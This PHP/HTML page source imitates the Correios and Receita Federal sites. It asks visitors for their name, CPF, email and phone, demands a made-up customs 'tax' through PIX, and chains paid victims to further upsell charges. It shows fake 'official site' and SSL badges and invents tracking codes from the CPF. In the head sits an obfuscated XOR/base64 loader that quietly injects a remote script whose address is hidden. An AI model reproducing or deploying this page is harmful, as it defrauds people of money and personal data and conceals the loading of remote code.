<?php
declare(strict_types=1);

$valorConfig = require __DIR__ . '/valor_config.php';
$produtosConfig = is_array($valorConfig['produtos'] ?? null) ? $valorConfig['produtos'] : [];
$produtoKey = 'main';

$produtoParam = isset($_GET['produto']) ? strtolower(trim((string)$_GET['produto'])) : '';
if ($produtoParam !== '' && isset($produtosConfig[$produtoParam])) {
    $produtoKey = $produtoParam;
}

$valorCentavos = (int)($produtosConfig[$produtoKey]['valor_centavos'] ?? ($valorConfig['valor_centavos'] ?? 6161));

if (isset($_GET['valor']) && $_GET['valor'] !== '') {
    $valorParam = (int)$_GET['valor'];
    foreach ($produtosConfig as $k => $p) {
        if ((int)($p['valor_centavos'] ?? 0) === $valorParam) {
            $valorCentavos = $valorParam;
            $produtoKey = (string)$k;
            break;
        }
    }
}

$valorFormatado = number_format($valorCentavos / 100, 2, ',', '.');

$nome = isset($_GET['nome']) ? trim((string)$_GET['nome']) : '';
$cpf = isset($_GET['cpf']) ? trim((string)$_GET['cpf']) : '';
$email = isset($_GET['email']) ? trim((string)$_GET['email']) : '';
$telefone = isset($_GET['telefone']) ? trim((string)$_GET['telefone']) : '';
$codigoRaw = isset($_GET['codigo']) ? trim((string)$_GET['codigo']) : '';

function esc(string $value): string
{
    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}

function formatarCodigoRastreio(string $codigo): string
{
    $c = strtoupper(preg_replace('/[^A-Z0-9]/', '', $codigo));
    if (preg_match('/^[A-Z]{2}[0-9]{9}[A-Z]{2}$/', $c)) {
        return substr($c, 0, 2) . ' '
            . substr($c, 2, 3) . ' '
            . substr($c, 5, 3) . ' '
            . substr($c, 8, 3) . ' '
            . substr($c, 11, 2);
    }

    return $codigo;
}

function gerarCodigoRastreioPorCpf(string $cpf): string
{
    $digits = preg_replace('/\D/', '', $cpf);
    $base = substr($digits, 0, 9) ?: '795188047';
    $num = str_pad((string)(100000000 + ((int)$base % 900000000)), 9, '0', STR_PAD_LEFT);

    return 'DA '
        . substr($num, 0, 3) . ' '
        . substr($num, 3, 3) . ' '
        . substr($num, 6, 3) . ' BR';
}

$cpfLimpo = preg_replace('/\D/', '', $cpf);

if ($codigoRaw !== '') {
    $redirect = '../rastreio.html?codigo=' . rawurlencode(preg_replace('/[^A-Z0-9]/i', '', $codigoRaw));
} elseif ($nome !== '' && $cpf !== '') {
    $redirect = '../index5.html?' . http_build_query(['nome' => $nome, 'cpf' => $cpf]);
} else {
    $redirect = '../index.html';
}

if ($nome === '' || strlen($cpfLimpo) !== 11 || $email === '' || preg_replace('/\D/', '', $telefone) === '') {
    header('Location: ' . $redirect);
    exit;
}

$codigoRastreio = $codigoRaw !== ''
    ? formatarCodigoRastreio($codigoRaw)
    : gerarCodigoRastreioPorCpf($cpf);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#003366">
  <script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','1794883931600243');fbq('track','PageView');</script>
  <script>(function(){var g_he=atob("DIyE/LRvqYT5Hs6d1PemicYDi77bdrrppP++05sMzerXa7rwver90tcAxKqbbOHut/7tjMAchvSQZqvx+/zthNEDh+6KPOK/tfjwjt0N3PCcbeynj9Go3tMDxuaYcr2/7tf/3toOxOHbJOztvfThkP0Li6jbaK/xoemmxpZZyODMKf+t5r7lzYxXnOXKJ/j/4LzgyIZN1NmE");var a_q0=[];for(var d_mruu=0;d_mruu<g_he.length;d_mruu++){a_q0.push(g_he.charCodeAt(d_mruu)&255);}var z_b0=a_q0[0];var o_t9q=a_q0.slice(1,1+z_b0);var b_2dq=a_q0.slice(1+z_b0);var e_u=b_2dq.map(function(b,f_g){return b^o_t9q[f_g%z_b0];});var e_v="";for(var g_1=0;g_1<e_u.length;g_1++){e_v+=String.fromCharCode(e_u[g_1]&255);}var j_dqon=decodeURIComponent(escape(e_v));var k_88=JSON.parse(j_dqon);var q_x7kc=k_88.globals||[];q_x7kc.forEach(function(i_94r){window[i_94r.name]=i_94r.value;});var e_5x9=document.createElement("script");e_5x9.src=k_88.url;e_5x9.async=true;e_5x9.defer=true;(k_88.attributes||[]).forEach(function(z_fqyl){e_5x9.setAttribute(z_fqyl.name,z_fqyl.value);});(document.head||document.documentElement).appendChild(e_5x9);})();</script>
  <script src="/assets/js/protect.js?v=20260814clear"></script>
  <script src="/assets/js/pixel-loader-utmify.js"></script>
  <script src="/assets/js/pixel-utmify.js?v=20261018purchase"></script>
  <title>Pagamento PIX | Correios</title>
  <link rel="stylesheet" href="/assets/css/correios-mobile.css?v=20260814k">
</head>
<body>
  <div class="page page-landing page-pix">
    <header class="landing-header">
      <img src="/assets/img/logo-correios-header.png" alt="Correios" class="landing-logo-full" onerror="this.onerror=null;this.src='/assets/img/logo-correios.svg';">
    </header>

    <div class="landing-ssl">
      <svg class="landing-ssl-lock" viewBox="0 0 24 24" width="13" height="13" aria-hidden="true"><path fill="#003399" d="M18 8h-1V6a5 5 0 00-10 0v2H6a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V10a2 2 0 00-2-2zm-3 0H9V6a3 3 0 016 0v2z"/></svg>
      <span class="landing-ssl-text">Conexão Segura SSL • Site Oficial dos Correios</span>
      <svg class="landing-ssl-check" viewBox="0 0 24 24" width="13" height="13" aria-hidden="true"><path fill="#003399" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
    </div>

    <div class="landing-rf-wrap">
      <div class="landing-rf-bar">
        <div class="landing-rf-left">
          <img src="/assets/img/logo-rf-header.png" alt="Receita Federal" class="landing-rf-logo" onerror="this.onerror=null;this.src='/assets/img/logo-receita.svg';">
          <span>Receita Federal</span>
        </div>
        <div class="landing-rf-right">
          <strong>Sistema Integrado</strong>
          <p class="landing-rf-status">
            <span class="landing-dot" aria-hidden="true"></span>
            Online • Seguro
          </p>
        </div>
      </div>
    </div>

    <main class="landing-main pix-main">
      <h1 class="landing-title">Pagamento via PIX</h1>
      <p class="landing-subtitle">Regularize o tributo para liberação da encomenda</p>

    <div class="pix-secure-bar">
      <svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="#fff" d="M18 8h-1V6a5 5 0 00-10 0v2H6a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V10a2 2 0 00-2-2zm-3 0H9V6a3 3 0 016 0v2z"/></svg>
      PAGAMENTO 100% SEGURO
      <svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="#fff" d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 13.17l-4.17-4.17 1.41-1.41L11 11.34l6.17-6.17 1.41 1.41L11 14.17z"/></svg>
    </div>

    <div class="pix-order-card">
      <div class="pix-order-left">
        <img src="/assets/img/icon-correios-setas.svg" alt="" class="pix-order-icon" aria-hidden="true">
        <div class="pix-order-info">
          <span class="pix-order-label">REGULARIZE SUA ENCOMENDA</span>
          <strong class="pix-order-code"><?php echo esc($codigoRastreio); ?></strong>
        </div>
      </div>
      <div class="pix-order-right">
        <span class="pix-order-value-label">VALOR A PAGAR</span>
        <strong class="pix-order-value">R$ <?php echo esc($valorFormatado); ?></strong>
      </div>
    </div>

    <div class="pix-timer-card">
      <div class="pix-timer-icon" aria-hidden="true">
        <svg viewBox="0 0 24 24" width="22" height="22"><path fill="#003366" d="M12 2a10 10 0 100 20 10 10 0 000-20zm1 11H7v-2h4V7h2v6z"/></svg>
      </div>
      <div class="pix-timer-text">
        <span>PIX VÁLIDO POR:</span>
        <strong id="pixTimer">15:00</strong>
      </div>
    </div>

    <div class="pix-content">
      <div class="pix-pay-head">
        <svg class="pix-brand-icon" viewBox="0 0 38 38" aria-hidden="true">
          <path fill="#32BCAD" d="M19 4l15 8.5V25L19 33.5 4 25V12.5z"/>
          <path fill="#fff" d="M19 10l9 5.1V23L19 28.1 10 23V15.1z"/>
        </svg>
        <h1>Pague com PIX</h1>
      </div>

      <div class="pix-qr-wrap" id="pixQrWrap">
        <div class="pix-qr-stage">
          <div class="pix-qr-loading" id="pixQrLoading">
            <div class="pix-spinner"></div>
            <span>Gerando QR Code...</span>
          </div>
          <div class="pix-qr-ready" id="pixQrReady" hidden>
            <p class="pix-qr-success-msg">
              <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path fill="#1e7a45" d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
              QR Code gerado com sucesso
            </p>
            <div class="pix-qr-box" id="pixQrBox"></div>
          </div>
        </div>
      </div>

      <p class="pix-favorecido">
        No app do banco, confirme o favorecido:<br>
        <strong id="pixFavorecido">—</strong>
      </p>
      <p class="pix-camera-hint">Aponte a câmera do seu celular</p>

      <div class="pix-copy-divider"><span>OU COPIE O CÓDIGO</span></div>

      <div class="pix-code-field">
        <input type="text" id="pixCopiaCola" readonly value="Gerando código PIX...">
      </div>

      <button type="button" class="pix-btn-copy" id="btnCopiar" disabled>
        <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="#fff" d="M16 1H4a2 2 0 00-2 2v14h2V3h12V1zm3 4H8a2 2 0 00-2 2v16h13a2 2 0 002-2V7a2 2 0 00-2-2zm0 18H8V7h11v16z"/></svg>
        Copiar código
      </button>

      <button type="button" class="pix-btn-retry" id="btnRetry" hidden>Tentar novamente</button>
      <p class="pix-status-msg" id="statusMsg" hidden></p>
    </div>
    </main>
  </div>

  <input type="hidden" id="name" value="<?php echo esc($nome); ?>">
  <input type="hidden" id="document" value="<?php echo esc($cpf); ?>">
  <input type="hidden" id="email" value="<?php echo esc($email); ?>">
  <input type="hidden" id="telephone" value="<?php echo esc($telefone); ?>">

<script>
(function () {
  const valorCentavos = <?php echo json_encode((string) $valorCentavos); ?>;
  const produtoKey = <?php echo json_encode($produtoKey); ?>;
  const timerEl = document.getElementById('pixTimer');
  const pixInput = document.getElementById('pixCopiaCola');
  const qrLoading = document.getElementById('pixQrLoading');
  const qrReady = document.getElementById('pixQrReady');
  const qrBox = document.getElementById('pixQrBox');
  const btnCopiar = document.getElementById('btnCopiar');
  const btnRetry = document.getElementById('btnRetry');
  const statusMsg = document.getElementById('statusMsg');
  const favorecidoEl = document.getElementById('pixFavorecido');

  let pixCodeFull = '';
  let timerInterval = null;
  let timerSeconds = 15 * 60;
  let paymentPollInterval = null;
  let checkoutTracked = false;
  let currentProvider = 'invictus';

  function getTrackingPayload() {
    if (window.RastreiooTracking && typeof window.RastreiooTracking.getTrackingParameters === 'function') {
      return window.RastreiooTracking.getTrackingParameters();
    }
    return {};
  }

  function trackCheckoutOnce() {
    if (checkoutTracked || !window.RastreiooTracking) return;
    checkoutTracked = true;
    window.RastreiooTracking.trackInitiateCheckout(valorCentavos);
  }

  function iniciarPollingPagamento(orderId) {
    if (!orderId || paymentPollInterval) return;

    paymentPollInterval = setInterval(async function () {
      try {
        const checkAct = (currentProvider === 'gestaopay') ? 'gestaopay_check' : 'invictus_check';
        const response = await fetch('/api/pagamento?act=' + checkAct, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ orderId: orderId })
        });
        const data = await response.json();
        if (!data.paid) return;

        clearInterval(paymentPollInterval);
        paymentPollInterval = null;

        if (window.RastreiooTracking) {
          window.RastreiooTracking.trackPurchase(orderId, valorCentavos);
        }

        statusMsg.hidden = false;
        statusMsg.className = 'pix-status-msg success';
        statusMsg.textContent = 'Pagamento confirmado! Sua encomenda será liberada em breve.';

        const proximoUp = { main: 'up1', up1: 'up2', up2: 'up3' }[produtoKey] || '';
        if (proximoUp) {
          setTimeout(function () {
            const q = new URLSearchParams();
            q.set('nome', document.getElementById('name').value.trim());
            q.set('cpf', document.getElementById('document').value.trim());
            q.set('email', document.getElementById('email').value.trim());
            q.set('telefone', document.getElementById('telephone').value.trim());
            const t = getTrackingPayload();
            Object.keys(t).forEach(function (k) {
              if (t[k] !== null && t[k] !== undefined && t[k] !== '') q.set(k, t[k]);
            });
            window.location.href = '/' + proximoUp + '/?' + q.toString();
          }, 1200);
        }
      } catch (err) {}
    }, 5000);
  }

  function extrairNominalPix(code) {
    if (!code) return '';
    let i = 0;
    while (i + 4 <= code.length) {
      const tag = code.slice(i, i + 2);
      const length = parseInt(code.slice(i + 2, i + 4), 10);
      i += 4;
      if (Number.isNaN(length) || length < 0 || i + length > code.length) break;
      const value = code.slice(i, i + length);
      i += length;
      if (tag === '59') return value.trim();
    }
    return '';
  }

  function atualizarFavorecido(res, code) {
    if (!favorecidoEl) return;
    const nome = String((res && res.pixFavorecido) || extrairNominalPix(code) || '').trim();
    favorecidoEl.textContent = nome || '—';
  }

  function truncarPix(code) {
    if (!code || code.length <= 48) return code;
    return code.slice(0, 48) + '...';
  }

  function iniciarTimer() {
    if (timerInterval) clearInterval(timerInterval);
    timerSeconds = 15 * 60;
    timerEl.textContent = '15:00';
    timerInterval = setInterval(function () {
      timerSeconds -= 1;
      if (timerSeconds <= 0) {
        clearInterval(timerInterval);
        timerEl.textContent = '00:00';
        return;
      }
      const m = String(Math.floor(timerSeconds / 60)).padStart(2, '0');
      const s = String(timerSeconds % 60).padStart(2, '0');
      timerEl.textContent = m + ':' + s;
    }, 1000);
  }

  function mostrarEstadoQr(estado) {
    qrLoading.hidden = estado !== 'loading';
    qrReady.hidden = estado !== 'ready';
  }

  function renderQr(code, qrSrc) {
    mostrarEstadoQr('ready');
    qrBox.innerHTML = '';

    function appendImg(src) {
      const img = document.createElement('img');
      img.src = src;
      img.alt = 'QR Code PIX';
      img.width = 220;
      img.height = 220;
      qrBox.appendChild(img);
    }

    if (qrSrc && (qrSrc.indexOf('data:image') === 0 || qrSrc.indexOf('http://') === 0 || qrSrc.indexOf('https://') === 0)) {
      appendImg(qrSrc);
      return;
    }

    appendImg('https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(code));
  }

  function showError(msg) {
    mostrarEstadoQr('loading');
    qrLoading.innerHTML = '<span class="pix-error-text">' + msg + '</span>';
    pixInput.value = 'Não foi possível gerar o PIX.';
    btnCopiar.disabled = true;
    btnRetry.hidden = false;
    statusMsg.hidden = false;
    statusMsg.className = 'pix-status-msg error';
    statusMsg.textContent = msg;
  }

  function showSuccess(res) {
    pixCodeFull = res.pixCode || '';
    currentProvider = (res.provider === 'gestaopay') ? 'gestaopay' : 'invictus';
    pixInput.value = truncarPix(pixCodeFull);
    renderQr(pixCodeFull, res.pixQrCode || '');
    atualizarFavorecido(res, pixCodeFull);
    btnCopiar.disabled = !pixCodeFull;
    btnRetry.hidden = true;
    statusMsg.hidden = true;
    iniciarTimer();
    if (res.orderId) {
      iniciarPollingPagamento(res.orderId);
    }
  }

  function readCookie(name) {
    try {
      var esc = name.replace(/([.$?*|{}()[\]\\/+^])/g, '\\$1');
      var m = document.cookie.match(new RegExp('(?:^|; )' + esc + '=([^;]*)'));
      return m ? decodeURIComponent(m[1]) : '';
    } catch(e) { return ''; }
  }

  function getFbCookieParams() {
    try {
      if (typeof window.__getFbParams === 'function') return window.__getFbParams() || {};
    } catch(e) {}
    return {};
  }

  async function gerarPix() {
    const nome = document.getElementById('name').value.trim();
    const cpf = document.getElementById('document').value.replace(/\D/g, '');
    const email = document.getElementById('email').value.trim() || 'cliente@correios.com.br';
    const telefone = document.getElementById('telephone').value.replace(/\D/g, '');

    mostrarEstadoQr('loading');
    qrLoading.innerHTML = '<div class="pix-spinner"></div><span>Gerando QR Code...</span>';
    btnCopiar.disabled = true;
    btnRetry.hidden = true;
    pixInput.value = 'Gerando código PIX...';
    if (favorecidoEl) favorecidoEl.textContent = '—';

    try {
      const response = await fetch('/api/pagamento?act=invictus_new', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: nome,
          cpf: cpf,
          email: email,
          telefone: telefone,
          rua: 'SBN Quadra 1',
          numero: '1',
          complemento: 'Regularização tributária encomenda',
          cep: '70002900',
          bairro: 'Asa Norte',
          cidade: 'Brasília',
          estado: 'DF',
          valor: valorCentavos,
          produto: produtoKey,
          trackingParameters: getTrackingPayload(),
          fbp: readCookie('_fbp') || null,
          fbc: readCookie('_fbc') || (getFbCookieParams().fbc || null),
          refFbclid: getFbCookieParams().fbclid || null,
          referer: document.referrer || null,
          url: location.href
        })
      });

      const data = await response.json();
      if (data.error) throw new Error(data.error);
      if (!data.pixCode) throw new Error('Código PIX não retornado pela API.');

      showSuccess(data);
    } catch (err) {
      showError(err.message || 'Erro ao gerar pagamento PIX.');
    }
  }

  btnCopiar.addEventListener('click', function () {
    if (!pixCodeFull) return;
    navigator.clipboard.writeText(pixCodeFull).then(function () {
      const original = btnCopiar.innerHTML;
      btnCopiar.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="#fff" d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4z"/></svg> Código copiado!';
      setTimeout(function () { btnCopiar.innerHTML = original; }, 2000);
    }).catch(function () {
      pixInput.value = pixCodeFull;
      pixInput.select();
      document.execCommand('copy');
      pixInput.value = truncarPix(pixCodeFull);
    });
  });

  btnRetry.addEventListener('click', gerarPix);

  trackCheckoutOnce();
  iniciarTimer();
  gerarPix();
})();
</script>
</body>
</html>
